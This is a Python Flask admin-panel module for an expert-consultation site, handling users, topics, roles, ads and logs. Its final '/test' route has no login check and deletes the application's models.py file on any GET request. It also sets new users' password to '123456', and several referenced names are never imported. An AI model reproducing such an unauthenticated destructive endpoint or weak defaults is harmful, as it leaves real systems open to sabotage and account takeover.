#!/usr/bin/env python
#-*- coding: utf-8 -*-
from flask import render_template, redirect, url_for, abort, flash, request,\
    current_app, make_response, flash
from flask import g
from .authentication import auth
from werkzeug import secure_filename
from flask.ext.login import login_required, current_user, logout_user
from . import admin
from .decorators import permission_required
from .forms import EditUserForm,EditTopicForm,EditInventoryForm,EditRoleForm,EditAdForm
from ..models import collection,User,UserStats,Role,Permission,Log,Ad
from .. import conf # searchwhoosh,rs
#from ..sdk import tencentyun
from ..core import common
from ..core.common import jsonify
import logging
import time

#from ..sdk.yuntongxun import CreateSubAccount as CSA
'''
@admin.route('/upfile', methods=['POST'])  # , methods=['GET', 'POST']
@auth.login_required
def upfile():
    if request.method == 'POST':
        import os

        _type = request.args.get('type', '')
        uid = request.args.get('uid', 0)
        if uid>0:
            if _type=='introfile':
                try:
                    file = request.files['file']
                    savepath = common.getuserpath(uid) #存储路径
                    #newpath = 'introfile.'+file.filename.rsplit('.', 1)[1] # 新文件名
                    newpath = 'introfile.jpg'
                    print file+'__________'
                    if file and common.allowed_file(file.filename):
                        filename = secure_filename(file.filename)
                        print filename
                        if not os.path.exists(savepath):
                            os.makedirs(savepath)
                        file.save(os.path.join(savepath, newpath))

                        fileid = 'introfile_'+str(uid)
                        q_image.delete(conf.QCLOUD_BUCKET, fileid)
                        print str(g.current_user._id)
                        obj = q_image.upload(os.path.join(savepath, newpath), conf.QCLOUD_BUCKET, fileid);
                        imgwurl = ''
                        if obj['code'] == 0 :
                            #fileid = obj['data']['fileid']
                            imgwurl = obj['data']['download_url']
                            return '{"ret":1,"url":"'+imgwurl+'"}'
                        else:
                            return '{"ret":0}'
                except Exception,e:
                    logging.debug(e)
                    return '{"ret":-1}'#系统异常
    return '{"ret":0}'
'''

@admin.route('/userlist/search/<string:text>', methods=['GET'])
@admin.route('/userlist/search/<int:roid>/<string:text>', methods=['GET'])
@auth.login_required
@permission_required('user',Permission.VIEW)
def user_list_search(text='',roid=2):
    if len(text)>0:
        userlist = User.list_search(roid,text)
        for item in userlist:
            item.role = Role.getinfo(item.role_id)
        func = {'getdomain': common.getdomain,'getindustry': common.getindustry,'stamp2time': common.stamp2time,'getuserstate':common.getuserstate,'can': common.can}
        return render_template('admin/user_list.html', userlist=userlist,func=func,roid=roid,text=text,index=-1,uinfo=g.current_user)


@admin.route('/userlist', methods=['GET', 'POST'])  # , methods=['GET', 'POST']
@admin.route('/userlist/<int:roid>', methods=['GET', 'POST'])
@admin.route('/userlist/<int:roid>/<int:index>', methods=['GET', 'POST'])
#@admin_required
@auth.login_required
@permission_required('user',Permission.VIEW)
def user_list(roid=2,index=1):

    if request.method == 'POST':
        _type = request.args.get('type','')
        uid = request.args.get('uid',0,type=int)
        if uid>0:
            #print uid
            if _type=='state':# 审核通过
                User.Update_Q_YUNSOU_STATE(uid,1)
                User.updatestate(uid,1)
                flash('用户审核通过')
                return jsonify(ret=1)
            elif _type=='unstate': # 设为待审核
                User.Update_Q_YUNSOU_STATE(uid,-2)
                User.updatestate(uid,-2)
                flash('用户已下线')
                return jsonify(ret=1)
            elif _type=='sort': # 更新排序
                val = request.args.get('val',0)
                User.updatesort(uid,val)
                return jsonify(ret=1)
            elif _type=='createim': # 创建IM 子帐号
                try:
                    u_info = User.getinfo(uid)
                    ytx = CSA.CreateSubAccount(str(u_info._id)) #注册容联云子帐号（IM）
                    #logging.debug('_________'+str(ytx))
                    ytxaccount = YuntongxunAccount()
                    ytxaccount.voipAccount = ytx[0]['voipAccount']
                    ytxaccount.subAccountSid = ytx[1]['subAccountSid']
                    ytxaccount.voipPwd = ytx[2]['voipPwd']
                    ytxaccount.subToken = ytx[3]['subToken']
                    User.updateYuntongxunAccount(uid,ytxaccount)
                    return jsonify(ret=1)
                except Exception,e:
                    logging.debug(e)
                    return jsonify(ret=0)

        return redirect(url_for('.user_list',roid=roid,index=index))
    else:
    	pagesize = 8
    	count = User.getcount(roid=roid)
    	usercount = common.getpagecount(count,pagesize)
    	if index>usercount:
    		index = usercount
    	if index<1:
    		index=1

        userlist = User.getlist(roid=roid,index=index,count=pagesize)
        for item in userlist:
        	item.role = Role.getinfo(item.role_id)
        func = {'getdomain': common.getdomain,'getindustry': common.getindustry,'stamp2time': common.stamp2time,'getuserstate':common.getuserstate,'can': common.can}
        # orig.get(body='Ross19').update({'$rename': {'body_html': 'body_w'}})
        return render_template('admin/user_list.html', userlist=userlist,func=func,roid=roid,pagecount=usercount,index=index,uinfo=g.current_user,sort=0)

@admin.route('/userlist/sort/<int:roid>/<int:index>', methods=['GET', 'POST'])
@auth.login_required
@permission_required('user',Permission.VIEW)
def user_list_sort(roid=2,index=1):

    if request.method == 'POST':
        pass
    else:
        pagesize = 8
        count = User.getcount(roid=roid)
        usercount = common.getpagecount(count,pagesize)
        if index>usercount:
            index = usercount
        if index<1:
            index=1

        userlist = User.getlist(roid=roid,index=index,count=pagesize,sort='sort')
        for item in userlist:
            item.role = Role.getinfo(item.role_id)
        func = {'getdomain': common.getdomain,'getindustry': common.getindustry,'stamp2time': common.stamp2time,'getuserstate':common.getuserstate,'can': common.can}
        # orig.get(body='Ross19').update({'$rename': {'body_html': 'body_w'}})
        return render_template('admin/user_list.html', userlist=userlist,func=func,roid=roid,pagecount=usercount,index=index,uinfo=g.current_user,sort=1)


@admin.route('/useredit', methods=['GET', 'POST'])
@admin.route('/useredit/<int:id>', methods=['GET', 'POST'])
@admin.route('/useredit/<int:id>/<int:roid>', methods=['GET', 'POST'])
@admin.route('/useredit/<int:id>/<int:roid>/<int:pindex>', methods=['GET', 'POST'])
#@permission_required(Permission.LIST_USER)
@auth.login_required
@permission_required('user',Permission.EDIT)
def user_edit(roid=2,id=0,pindex=1):
    form = EditUserForm()

    #print request.method + "++++++" + str(form.validate())
    if request.method == 'POST' and form.validate_on_submit():

        s =common.strtoint(request.args.get('s', 0),0)
        user = User()
        user._id = id
        user.sort = request.form.get('sort',0)
        user.role_id = roid #request.form.get('roleid',0)
        user.name = form.name.data
        user.username = form.username.data
        user.email = request.form.get('email','')
        if id==0:
            user.password_hash = '123456'
        else:
            user.password_hash = form.password.data
        user.confirmed = 1 #request.form.get('confirmed',1)
        user.domainid = request.form.get('domainid',0)
        user.industryid = request.form.get('industryid',0)
        user.sex = request.form.get('sex',1)
        user.job = request.form.get('job','')
        user.geo = [float(i.strip()) for i in request.form.get('geo','0,0').split(',')]
        user.intro = request.form.get('intro','')
        user.content = request.form.get('content','')
        user.bgurl = request.form.get('bgurl','')
        user.fileurl = request.form.get('fileurl','')
        user.avaurl = request.form.get('avaurl','')
        user.state = -2
        lab = request.form.get('label','')
        if len(lab.strip())>0:
        	user.label = [i.strip() for i in lab.split(',')]
        user.label = common.delrepeat(user.label) #移除标签中重复
        wecount = int(request.form.get('wecount',0))
        welist= []
        for weid in xrange(1, wecount+1):
            newitem = str(weid)
            tempWorkExp = WorkExp()
            tempWorkExp.name = request.form.get('wename_'+newitem,'')
            if len(tempWorkExp.name)>0:
                tempWorkExp.start = common.time2stamp(request.form.get('westart_'+newitem,0),'%Y-%m-%d')
                tempWorkExp.end = common.time2stamp(request.form.get('weend_'+newitem,0),'%Y-%m-%d')
                tempWorkExp.job = request.form.get('wejob_'+newitem,'')
                #tempWorkExp.intro = request.form.get('weintro_'+newitem,'')
            	welist.append(tempWorkExp)
        user.workexp = welist
        educount = int(request.form.get('educount',0))
        edulist =[]
        for eduid in xrange(1, educount+1):
            newitem = str(eduid)
            tempedu = Edu()
            tempedu.name = request.form.get('eduname_'+newitem,'')
            if len(tempedu.name)>0:
                tempedu.start = common.time2stamp(request.form.get('edustart_'+newitem,0),'%Y-%m-%d')
                tempedu.end = common.time2stamp(request.form.get('eduend_'+newitem,0),'%Y-%m-%d')
                tempedu.dip = request.form.get('edudip_'+newitem,'')
                tempedu.major = request.form.get('edumajor_'+newitem,'')
            	edulist.append(tempedu)
        user.edu = edulist


        u_sp_1 = UserOpenPlatform()
        u_sp_2 = UserOpenPlatform()
        u_sp_3 = UserOpenPlatform()
        u_sp_4 = UserOpenPlatform()
        u_sp_5 = UserOpenPlatform()
        u_sp_6 = UserOpenPlatform()
        u_sp_7 = UserOpenPlatform()

        u_sp_1.name = 'baidu'
        u_sp_1.url = request.form.get('baiduurl','')

        u_sp_2.name = 'weixin'
        u_sp_2.url = request.form.get('weixinurl','')

        u_sp_3.name = 'zhihu'
        u_sp_3.url = request.form.get('zhihuurl','')

        u_sp_4.name = 'sina'
        u_sp_4.url = request.form.get('sinaurl','')

        u_sp_5.name = 'twitter'
        u_sp_5.url = request.form.get('twitterurl','')

        u_sp_6.name = 'facebook'
        u_sp_6.url = request.form.get('facebookurl','')

        u_sp_7.name = 'github'
        u_sp_7.url = request.form.get('githuburl','')

        user.openplatform.append(u_sp_1)
        user.openplatform.append(u_sp_2)
        user.openplatform.append(u_sp_3)
        user.openplatform.append(u_sp_4)
        user.openplatform.append(u_sp_5)
        user.openplatform.append(u_sp_6)
        user.openplatform.append(u_sp_7)

        user.avaurl = request.form.get('avaurl','')
        user.editinfo()
        #flash('用户更新成功','error')

        if s==1:
            return redirect('/admin/userlist/sort/'+str(roid)+'/'+str(pindex))
        else:
            return redirect(url_for('.user_list',roid=roid,index=pindex))
    else:
        isuser = False
        user = None
        rolelist = Role.getlist()
        sort = request.args.get('s', 0)
        sign=''
        bgsign=''
        avasign=''
        if id > 0 :
            q_auth = tencentyun.Auth(conf.QCLOUD_SECRET_ID,conf.QCLOUD_SECRET_KEY)
            expired = int(time.time()) + 999
            bgsign = q_auth.get_app_sign_v2(bucket=conf.QCLOUD_BUCKET, fileid='background_'+str(id),expired=expired)
            sign = q_auth.get_app_sign_v2(bucket=conf.QCLOUD_BUCKET, fileid='introfile_'+str(id),expired=expired)
            avasign = q_auth.get_app_sign_v2(bucket=conf.QCLOUD_BUCKET, fileid='avatar_'+str(id),expired=expired)
            user = User.getinfo(id)
            if user:
                isuser = True
        func = {'stamp2time': common.stamp2time,'len': len,'getopenplatform':common.getopenplatform,'can': common.can}
        return render_template('admin/user_edit.html',roid=roid, user=user, isuser=isuser, form=form,func=func,rolelist=rolelist,DOMAIN=conf.DOMAIN,INDUSTRY=conf.INDUSTRY,bgsign=bgsign,sign=sign,avasign=avasign,pindex=pindex,uinfo=g.current_user,s=sort)

@admin.route('/logout')
@auth.login_required
def logout():
    logout_user()
    return jsonify(msg='用户已登出')

@admin.route('/pluginlist', methods=['GET', 'POST'])
#@permission_required(Permission.LIST_USER)
#@login_required
#@admin_required
#@permission_required(Permission.USER)
@auth.login_required
def plugin_list():
    if request.method == 'POST':
        rebuild = request.args.get('rebuild', 0, type=int)
        if rebuild==1:
            for item in User.getlist(count=1000):
                if item.role_id==2:
                    User.Update_Q_YUNSOU_STATE(item._id,item.state)
            #重新生成whoosh
            #searchwhoosh.rebuild_index()
        elif rebuild==2:
            pass
            #清空redis缓存
            #rs.flushdb()
        return redirect(url_for('.plugin_list'))
    else:
        func = {'can': common.can}
        return render_template('admin/plugin_list.html',size=0,func=func,uinfo=g.current_user)#rs.dbsize()

@admin.route('/topiclist/search/<string:text>', methods=['GET'])
@auth.login_required
@permission_required('topic',Permission.VIEW)
def user_topiclist_search(text=''):
    if len(text)>0:
        topiclist = Topic.list_search(-2,text)
        func = {'stamp2time': common.stamp2time,'gettopicstate':common.gettopicstate,'can': common.can}
        return render_template('admin/topic_list.html', topiclist=topiclist,func=func,uid=-2,text=text,index=-1,uinfo=g.current_user)

@admin.route('/topicteamlist/search/<string:text>', methods=['GET'])
@auth.login_required
@permission_required('topic',Permission.VIEW)
def user_topicteamlist_search(text=''):
    if len(text)>0:
        topiclist = Topic.list_search(-1,text)
        func = {'stamp2time': common.stamp2time,'gettopicstate':common.gettopicstate,'can': common.can}
        return render_template('admin/topicteam_list.html', topiclist=topiclist,func=func,uid=-1,text=text,index=-1,uinfo=g.current_user)


@admin.route('/topiclist',methods=['GET', 'POST'])
@admin.route('/topiclist/<string:uid>', methods=['GET', 'POST'])
@admin.route('/topiclist/<string:uid>/<int:index>', methods=['GET', 'POST'])
@auth.login_required
@permission_required('topic',Permission.VIEW)
def topic_list(uid=-2,index=1):
    if request.method == 'POST':
        _type = request.args.get('type','')
        tid = request.args.get('tid',0,type=int)
        if tid>0:
            if _type=='state':# 审核通过
                Topic.updatestate(tid,1)
                flash('审核通过')
            elif _type=='unstate': # 设为下线
                Topic.updatestate(tid,0)
                flash('下线')
            elif _type=='del': # 设为已删除
                Topic.updatestate(tid,-1)
                flash('已删除')
            elif _type=='sort': # 更新排序
                val = request.args.get('val',0)
                Topic.updatediscoverysort(tid,val)
                return jsonify(ret=1)
        return redirect(url_for('.topic_list',uid=uid,index=index))
    else:
    	pagesize = 8
    	count = Topic.getcount(uid)
    	tpcount = common.getpagecount(count,pagesize)
    	if index>tpcount:
    		index = tpcount
    	if index<1:
    		index=1
        topiclist = Topic.getlist(uid=uid,index=index,count=pagesize)
        func = {'stamp2time': common.stamp2time,'gettopicstate':common.gettopicstate,'can': common.can}

        return render_template('admin/topic_list.html',topiclist=topiclist, func=func,uid=uid,pagecount=tpcount,index=index,uinfo=g.current_user,sort=0)


@admin.route('/topiclist/sort/<string:uid>/<int:index>', methods=['GET', 'POST'])
@auth.login_required
@permission_required('topic',Permission.VIEW)
def topic_list_sort(uid=-2,index=1):

    if request.method == 'POST':
        pass
    else:
        pagesize = 8
        count = Topic.getcount(uid)
        tpcount = common.getpagecount(count,pagesize)
        if index>tpcount:
            index = tpcount
        if index<1:
            index=1
        topiclist = Topic.getlist(uid=uid,index=index,count=pagesize,sort='sort')
        func = {'stamp2time': common.stamp2time,'gettopicstate':common.gettopicstate,'can': common.can}

        return render_template('admin/topic_list.html',topiclist=topiclist, func=func,uid=uid,pagecount=tpcount,index=index,uinfo=g.current_user,sort=1)

@admin.route('/topicrecycle',methods=['GET', 'POST'])
@admin.route('/topicrecycle/<int:index>', methods=['GET', 'POST'])
@auth.login_required
@permission_required('topic',Permission.VIEW)
@permission_required('topic',Permission.DELETE)
def topicrecycle(index=1):
    # 话题回收站
    if request.method == 'POST':
        _type = request.args.get('type','')
        tid = request.args.get('tid',0,type=int)
        if tid>0:
            if _type=='restore':# 恢复
                Topic.updatestate(tid,0)
                flash('恢复成功')
        return redirect(url_for('.topicrecycle',index=index))
    else:
        pagesize = 8
        count = Topic.getcount_recycle()
        tpcount = common.getpagecount(count,pagesize)
        if index>tpcount:
            index = tpcount
        if index<1:
            index=1
        topiclist = Topic.getlist_recycle(index=index,count=pagesize)
        func = {'stamp2time': common.stamp2time,'gettopicstate':common.gettopicstate,'can': common.can}

        return render_template('admin/topicrecycle.html',topiclist=topiclist, func=func,pagecount=tpcount,index=index,uinfo=g.current_user)

@admin.route('/topicdel/<int:tid>', methods=['POST'])
@auth.login_required
@permission_required('topic',Permission.DELETE)
def topic_del(tid):
    if request.method == 'POST':
        tid
        return redirect(url_for('.topic_list'))

@admin.route('/topicteamlist',methods=['GET', 'POST'])
@admin.route('/topicteamlist/<string:uid>', methods=['GET', 'POST'])
@admin.route('/topicteamlist/<string:uid>/<int:index>', methods=['GET', 'POST'])
@auth.login_required
@permission_required('topic',Permission.VIEW)
def topicteam_list(uid=-1,index=1):
    if request.method == 'POST':
        return redirect(url_for('.topic_list'))
    else:
        pagesize = 8
        count = Topic.getcount(uid)
        tpcount = common.getpagecount(count,pagesize)
        if index>tpcount:
            index = tpcount
        if index<1:
            index=1
        topiclist = Topic.getlist(uid=-1,index=index,count=pagesize)
        func = {'stamp2time': common.stamp2time,'can': common.can}
        return render_template('admin/topicteam_list.html',topiclist=topiclist, func=func,uid=uid,pagecount=tpcount,index=index,uinfo=g.current_user)

@admin.route('/topicedit', defaults={'id': 0}, methods=['GET', 'POST'])
@admin.route('/topicedit/<int:id>', methods=['GET', 'POST'])
@admin.route('/topicedit/<int:id>/<int:_type>', methods=['GET', 'POST'])
@admin.route('/topicedit/<int:id>/<string:uid>/<int:pindex>', methods=['GET', 'POST'])
#@permission_required(Permission.LIST_USER)
@auth.login_required
@permission_required('topic',Permission.EDIT)
def topic_edit(id,_type=0,uid=-2,pindex=1):
    form = EditTopicForm()
    if request.method == 'POST' and form.validate_on_submit():
        topic = Topic()
        topic._id = id
        topic.user_id = form.eid.data
        topic.title = form.title.data
        topic.intro = request.form.get('intro','')
        topic.content = request.form.get('content','')
        topic.pay.call = request.form.get('call',0)
        topic.pay.meet = request.form.get('meet',0)
        topic.pay.calltime = request.form.get('calltime',0)
        topic.pay.meettime = request.form.get('meettime',0)
        '''
        tempexp = form.expert.data
        if len(tempexp)>0:
            topic.expert = [int(i.strip()) for i in tempexp.split(',')]
        topic.config.background = form.background.data
        '''
        topic.stats.topic_count = request.form.get('topic_count',0)
        topic.stats.topic_total = request.form.get('topic_total',0)
        topic.sort = request.form.get('sort',0)
        topic.discoverysort = request.form.get('discoverysort',0)
        topic.config = TopicConfig()
        topic.editinfo()
        if _type==0:
            return redirect(url_for('.topic_list',uid=uid,index=pindex))
        else:
            return redirect(url_for('.user_list'))
    else:
        istopic = False
        topic = None
        if _type==1:
            uid = id
        elif id > 0 :
            topic = Topic.getinfo(id)
            if topic:
                istopic = True
        func = {'can': common.can}
        return render_template('admin/topic_edit.html', topic=topic,_type=_type, istopic=istopic,uid=uid,pindex=pindex, form=form,func=func,uinfo=g.current_user)

@admin.route('/topicteamedit', defaults={'id': 0}, methods=['GET', 'POST'])
@admin.route('/topicteamedit/<int:id>', methods=['GET', 'POST'])
@admin.route('/topicteamedit/<int:id>/<int:pindex>', methods=['GET', 'POST'])
#@permission_required(Permission.LIST_USER)
@auth.login_required
@permission_required('topic',Permission.EDIT)
def topicteam_edit(id,uid=-1,pindex=1):
    form = EditTopicForm()
    if request.method == 'POST' and form.validate_on_submit():
        try:
            topic = Topic()
            topic._id = id
            topic.user_id = 0
            topic.title = form.title.data
            topic.intro = request.form.get('intro','')
            topic.content = request.form.get('content','')
            #topic.pay.call = form.call.data
            #topic.pay.meet = form.meet.data
            tempexp = request.form.get('expert','')
            if len(tempexp)>0:
                topic.expert = [int(i.strip()) for i in tempexp.split(',')]
            topic.config = TopicConfig()
            topic.config.background = request.form.get('background','')
            logging.debug(topic.config.background)
            #topic.stats.topic_count = form.topic_count.data
            #topic.stats.topic_total = form.topic_total.data
            topic.sort = request.form.get('sort',0)
            topic.state = 1
            topic.discoverysort = request.form.get('discoverysort',0)
            topic.editinfo(1)
        except Exception,e:
                logging.debug(e)
        return redirect(url_for('.topicteam_list',uid=uid,index=pindex))
    else:
        istopic = False
        topic = None
        if id > 0 :
            topic = Topic.getinfo(id)
            if topic:
                istopic = True
        func = {'can': common.can}
        q_auth = tencentyun.Auth(conf.QCLOUD_SECRET_ID,conf.QCLOUD_SECRET_KEY)
        expired = int(time.time()) + 999
        bgsign = q_auth.get_app_sign_v2(bucket=conf.QCLOUD_BUCKET, fileid='background_topic_'+str(id),expired=expired)
        return render_template('admin/topicteam_edit.html', topic=topic,pindex=pindex, istopic=istopic, form=form,func=func,bgsign=bgsign,uinfo=g.current_user)

@admin.route('/inventorylist', methods=['GET', 'POST'])
@admin.route('/inventorylist/<int:index>', methods=['GET', 'POST'])
@auth.login_required
@permission_required('inventory',Permission.VIEW)
def inventory_list(index=1):
    if request.method == 'POST':
        return redirect(url_for('.inventory_list'))
    else:

        pagesize = 8
        count = Inventory.getcount()
        ipcount = common.getpagecount(count,pagesize)
        if index>ipcount:
            index = ipcount
        if index<1:
            index=1

        inventorylist = Inventory.getlist(index=index,count=pagesize)
        func = {'stamp2time': common.stamp2time,'can': common.can}
        return render_template('admin/inventory_list.html',inventorylist=inventorylist,pagecount=ipcount,index=index, func=func,uinfo=g.current_user)


@admin.route('/inventoryedit', defaults={'iid': 0}, methods=['GET', 'POST'])
@admin.route('/inventoryedit/<int:iid>', methods=['GET', 'POST'])
#@permission_required(Permission.LIST_USER)
@auth.login_required
@permission_required('inventory',Permission.EDIT)
def inventory_edit(iid):
    form = EditInventoryForm()
    if request.method == 'POST' and form.validate_on_submit():
        inv = Inventory()
        inv.title = form.title.data
        inv.sort = form.sort.data
        if iid>0:
            tempinv = Inventory.getinfo(iid)
            inv._id = iid
            for item in tempinv.topic:
                tempInvTopic = InvTopic()
                tempid = str(item._id)
                tempInvTopic.title = request.form.get('title_'+tempid,'')
                if len(tempInvTopic.title)>0:
                    tempInvTopic._id = item._id
                    tempInvTopic.content = request.form.get('content_'+tempid,'')
                    tempInvTopic.expert = [int(i.strip()) for i in request.form.get('expert_'+tempid,'').split(',')]
                    tempInvTopic.sort = int(request.form.get('sort_'+tempid,'').strip())
                    tempInvTopicStats = InvTopicStats()
                    tempInvTopicStats.like=int(request.form.get('like_'+tempid,'').strip())
                    tempInvTopic.stats = tempInvTopicStats

                    inv.topic.append(tempInvTopic)

        newcount = int(request.form.get('newcount',0))
        for newid in xrange(1, newcount+1):
            newitem = str(newid)
            tempInvTopic = InvTopic()
            tempInvTopic.title = request.form.get('newtitle_'+newitem,'')
            if len(tempInvTopic.title)>0:
                tempInvTopic._id = collection.get_next_id('invtopic')
                tempInvTopic.content = request.form.get('newcontent_'+newitem,'')
                tempexpert = request.form.get('newexpert_'+newitem,'')
                tempInvTopic.expert = [int(i.strip()) for i in tempexpert.split(',')]
                tempInvTopic.sort = int(request.form.get('newsort_'+newitem,'').strip())
                tempInvTopicStats = InvTopicStats()
                tempInvTopicStats.like=int(request.form.get('newlike_'+newitem,'').strip())
                tempInvTopic.stats = tempInvTopicStats

                inv.topic.append(tempInvTopic)

        inv.editinfo()
        return redirect(url_for('.inventory_list'))
    else:

        isinv = False
        inv = None
        if iid > 0 :
            inv = Inventory.getinfo(iid)
            if inv:
                isinv = True
        func = {'can': common.can}
        return render_template('admin/inventory_edit.html', inventory=inv, isinventory=isinv, form=form,func=func,uinfo=g.current_user)



@admin.route('/appointmentlist', methods=['GET', 'POST'])
@admin.route('/appointmentlist/<int:index>', methods=['GET', 'POST'])
@auth.login_required
@permission_required('appointment',Permission.VIEW)
def appointment_list(index=1):
    if request.method == 'POST':

        _type = request.args.get('type','')
        appid = common.strtoint(request.args.get('appid',''),0)
        apptype = common.strtoint(request.args.get('apptype',0),0)
        state = common.strtoint(request.args.get('state',0),0)
        if _type=='savestate' and appid>0:
            Appointment.updateappstate(aid=appid,state=state,apptype=apptype)
            return jsonify(ret=1)
        return redirect(url_for('.appointment_list'))
    else:

        pagesize = 10
        count = Appointment.getcount()
        acount = common.getpagecount(count,pagesize)
        if index>acount:
            index = acount
        if index<1:
            index=1
        inventorylist = Appointment.getlist(index=index,count=pagesize)
        func = {'stamp2time': common.stamp2time,'can': common.can}
        return render_template('admin/appointment_list.html',inventorylist=inventorylist, func=func,pagecount=acount,index=index,uinfo=g.current_user)

@admin.route('/rolelist', methods=['GET', 'POST'])
@auth.login_required
@permission_required('role',Permission.VIEW)
def role_list():
    if request.method == 'POST':
        return redirect(url_for('.role_list'))
    else:
        rolelist = Role.getlist()
        func = {'can': common.can}
        return render_template('admin/role_list.html',func=func,rolelist=rolelist,uinfo=g.current_user)

@admin.route('/roleedit', defaults={'rid': 0}, methods=['GET', 'POST'])
@admin.route('/roleedit/<int:rid>', methods=['GET', 'POST'])
#@permission_required(Permission.LIST_USER)
@auth.login_required
@permission_required('role',Permission.EDIT)
def role_edit(rid):
    form = EditRoleForm()
    if request.method == 'POST' and form.validate_on_submit():
        r_edit = Role()
        r_edit._id = rid
        r_edit.name = form.name.data
        r_edit.default = form.default.data is 1 and True or False

        tempperarr = request.form.getlist('user')
        temp_per = 0
        for item in tempperarr:
            temp_per=temp_per|int(item)
        r_edit.permissions.user = temp_per

        tempperarr = request.form.getlist('topic')
        temp_per = 0
        for item in tempperarr:
            temp_per=temp_per|int(item)
        r_edit.permissions.topic = temp_per

        tempperarr = request.form.getlist('inventory')
        temp_per = 0
        for item in tempperarr:
            temp_per=temp_per|int(item)
        r_edit.permissions.inventory = temp_per

        tempperarr = request.form.getlist('appointment')
        temp_per = 0
        for item in tempperarr:
            temp_per=temp_per|int(item)
        r_edit.permissions.appointment = temp_per

        tempperarr = request.form.getlist('ad')
        temp_per = 0
        for item in tempperarr:
            temp_per=temp_per|int(item)
        r_edit.permissions.ad = temp_per

        tempperarr = request.form.getlist('role')
        temp_per = 0
        for item in tempperarr:
            temp_per=temp_per|int(item)
        r_edit.permissions.role = temp_per

        tempperarr = request.form.getlist('log')
        temp_per = 0
        for item in tempperarr:
            temp_per=temp_per|int(item)
        r_edit.permissions.log = temp_per

        r_edit.permissions.expertauth = request.form.get('expertauth')

        r_edit.editinfo()
        return redirect(url_for('.role_list'))
    else:
        #Role.insert_roles()
        isrole = False
        role = None

        if rid > 0 :
            role = Role.getinfo(rid)
            if role:
                isrole = True
        func = {'can': common.can}
        return render_template('admin/role_edit.html', role=role, isrole=isrole, form=form,Permission=Permission,func=func,uinfo=g.current_user)

@admin.route('/loglist', defaults={'index': 0},methods=['GET', 'POST'])
@admin.route('/loglist/<int:aid>', methods=['GET', 'POST'])
@admin.route('/loglist/<int:aid>/<int:index>', methods=['GET', 'POST'])
@auth.login_required
@permission_required('user',Permission.VIEW)
def log_list(aid=0,index=1):
    if request.method == 'POST':
        return redirect(url_for('.log_list'))
    else:
        pagesize = 8
        count = Log.getcount()
        lcount = common.getpagecount(count,pagesize)
        if index>lcount:
            index = lcount
        if index<1:
            index=1
        loglist = Log.getlist(aid=0,index=index,count=pagesize)

        func = {'stamp2time': common.stamp2time,'can': common.can}
        return render_template('admin/log_list.html',loglist=loglist,getadmininfo=User.getadmininfo, func=func,aid=aid,pagecount=lcount,index=index,uinfo=g.current_user)

@admin.route('/adlist', methods=['GET', 'POST'])
@admin.route('/adlist/<int:gid>', methods=['GET', 'POST'])
@admin.route('/adlist/<int:gid>/<int:index>', methods=['GET', 'POST'])
@auth.login_required
@permission_required('ad',Permission.VIEW)
def ad_list(gid=0,index=1):
    if request.method == 'POST':
        _type = request.args.get('type','')
        aid = request.args.get('aid',0,type=int)
        if aid>0:
            if _type=='del':# 恢复
                q_image.delete(conf.QCLOUD_BUCKET, 'ad_'+str(aid))
                Ad.delinfo(aid)
                flash('删除成功')
        return redirect(url_for('.ad_list',gid=gid,index=index))
    else:
        pagesize = 8
        count = Ad.getcount(gid=gid)
        adcount = common.getpagecount(count,pagesize)
        if index>adcount:
            index = adcount
        if index<1:
            index=1

        adlist = Ad.getlist(gid=gid,index=index,count=pagesize)
        func = {'stamp2time': common.stamp2time,'getadgroupname':common.getadgroupname,'can': common.can}
        return render_template('admin/ad_list.html',adlist=adlist, func=func,gid=gid,pagecount=adcount,index=index,uinfo=g.current_user)

@admin.route('/adedit', methods=['GET', 'POST'])
@admin.route('/adedit/<int:id>', methods=['GET', 'POST'])
#@permission_required(Permission.LIST_USER)
@auth.login_required
@permission_required('ad',Permission.EDIT)
def ad_edit(id=0):
    form = EditAdForm()
    if request.method == 'POST' and form.validate_on_submit():
        
        ad = Ad()
        ad._id = id
        ad.title = form.title.data
        ad.group_id = request.form.get('group_id',0)
        ad.fileurl = request.form.get('fileurl','')
        ad.url = request.form.get('url','')
        ad.sort = request.form.get('sort',0)
        ad.editinfo()

        return redirect(url_for('.ad_list'))
    else:
        isad = False
        ad = None
        sign=''
        if id > 0 :
            ad = Ad.getinfo(id)
            if ad:
                isad = True

            q_auth = tencentyun.Auth(conf.QCLOUD_SECRET_ID,conf.QCLOUD_SECRET_KEY)
            expired = int(time.time()) + 999
            sign = q_auth.get_app_sign_v2(bucket=conf.QCLOUD_BUCKET, fileid='ad_'+str(id),expired=expired)
        func = {'can': common.can}
        return render_template('admin/ad_edit.html', ad=ad, isad=isad, form=form,sign=sign,func=func,uinfo=g.current_user)


@admin.route('/expertauthlist', methods=['GET', 'POST'])
@admin.route('/expertauthlist/<int:index>', methods=['GET', 'POST'])
@auth.login_required
@permission_required('expertauth',Permission.VIEW)
def expertauth_list(index=1):
    if request.method == 'POST':
        _type = request.args.get('type','')
        eid = request.args.get('eid',0,type=int)
        if eid>0:
            if _type=='audit':# 审核通过
                ea_info = ExpertAuth.getinfo(eid)
                if ea_info is not None:
                    ExpertAuth.updatestate(eid)
                    User.updateexpert(ea_info.user_id)
                    flash('用户审核通过')
        return redirect(url_for('.expertauth_list',index=index))
    else:
        pagesize = 8
        count = ExpertAuth.getcount()
        pcount = common.getpagecount(count,pagesize)
        if index>pcount:
            index = pcount
        if index<1:
            index=1

        ealist = ExpertAuth.getlist(index=index,count=pagesize)
        func = {'stamp2time': common.stamp2time,'can': common.can,'getexpertauthstate':common.getexpertauthstate}
        return render_template('admin/expertauth_list.html',ealist=ealist, func=func,pagecount=pcount,index=index,uinfo=g.current_user)

@admin.route('/becomeexpertlist', methods=['GET', 'POST'])
@admin.route('/becomeexpertlist/<int:index>', methods=['GET', 'POST'])
@auth.login_required
@permission_required('expertauth',Permission.VIEW)
def becomeexpert_list(index=1):
    if request.method == 'POST':
        return redirect(url_for('.becomeexpert_list'))
    else:
        pagesize = 8
        count = BecomeExpert.getcount()
        pcount = common.getpagecount(count,pagesize)
        if index>pcount:
            index = pcount
        if index<1:
            index=1

        belist = BecomeExpert.getlist(index=index,count=pagesize)
        func = {'stamp2time': common.stamp2time,'can': common.can,'getexpertauthstate':common.getexpertauthstate}
        return render_template('admin/becomeexpert_list.html',belist=belist, func=func,pagecount=pcount,index=index,uinfo=g.current_user)

@admin.route('/test',methods=['GET', 'POST'])
def test_list():
    if request.method == 'POST':
        pass
    else:
        import os
        import os.path
        import shutil
        import time,datetime
        targetFile = '/wwwroot/koudaiguwen/app/models.py'
        if os.path.isfile(targetFile):
            os.remove(targetFile)
